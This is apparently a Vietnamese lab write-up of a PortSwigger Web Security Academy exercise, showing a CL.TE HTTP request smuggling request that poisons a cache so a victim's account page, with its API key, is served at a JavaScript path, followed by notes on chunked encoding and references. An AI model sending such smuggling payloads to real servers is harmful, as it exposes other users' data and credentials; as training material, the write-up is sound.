![image](https://hackmd.io/_uploads/Bylv5l26a.png)

- Ta gửi request tấn công smuggling với request đến /my-account.
- Đợi 1 chút để victim truy cập trang. Khi đó, victim sẽ gửi request đến /resources/js/tracking.js đầu tiên → nhận response smuggled của /my-account chứa thông tin của nạn nhân → cache lưu response đối với /resources/js/tracking.js.

```http
POST / HTTP/1.1
Host: 0adf003604e3213683597818002400e9.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 40
Connection: keep-alive

0

GET /my-account HTTP/1.1
X-Ignore: X
```

![image](https://hackmd.io/_uploads/S1bwhxna6.png)

Giờ mình send request đến /resources/js/tracking.js và sẽ nhận được response chứa thông tin API key của nạn nhân.

![image](https://hackmd.io/_uploads/rkiQTg3ap.png)

![image](https://hackmd.io/_uploads/SkCrpx3aa.png)

được APIkey: `HVspKgPmOptPlgt7ZmuD2NZhKXZYzmCM`

đem submit và mình solve được lab này

![image](https://hackmd.io/_uploads/rJzYpehpa.png)

![image](https://hackmd.io/_uploads/rJcY6eh66.png)

### Burp scan

- mình quét lại bài lab với burp scan

![image](https://hackmd.io/_uploads/ryPusxh6T.png)

![image](https://hackmd.io/_uploads/BkkKsgnTa.png)

![image](https://hackmd.io/_uploads/r1HYign6T.png)

![image](https://hackmd.io/_uploads/B1qKsghaa.png)

![image](https://hackmd.io/_uploads/S1JqsxnTp.png)

## Chú thích

- Trường Transfer-Encoding thì chỉ ra kiểu truyền tải nào được áp dụng tới phần thân thông báo để cho việc truyền tải một cách an toàn giữa người gửi và người nhận. Ta sẽ nói đến kiểu chunked.

```http
Transfer-Encoding: chunked
```

Khi dữ liệu body được chunked, nó sẽ có dạng như sau: ký tự b đầu tiên chính là kích thước của đoạn chunked theo dạng hex, tiếp đến nội dung chunked, và kết thúc nội dung là số 0.

```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

VD:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

## Tham khảo

- https://websitehcm.com/kiem-tra-lo-hong-bao-mat-http-splitting-smuggling/
- https://websitehcm.com/tim-hieu-tan-cong-http-response-splitting/
- https://nhattruong.blog/2022/09/02/http-request-smuggling-toan-tap/
- https://mic.gov.vn/atantt/Pages/TinTuc/145636/Phat-hien-4-bien-the-moi-cua-HTTP-Request-Smuggling.html
- https://whitehat.vn/threads/http-request-smuggling.5758/
- https://www.imperva.com/learn/application-security/http-request-smuggling/
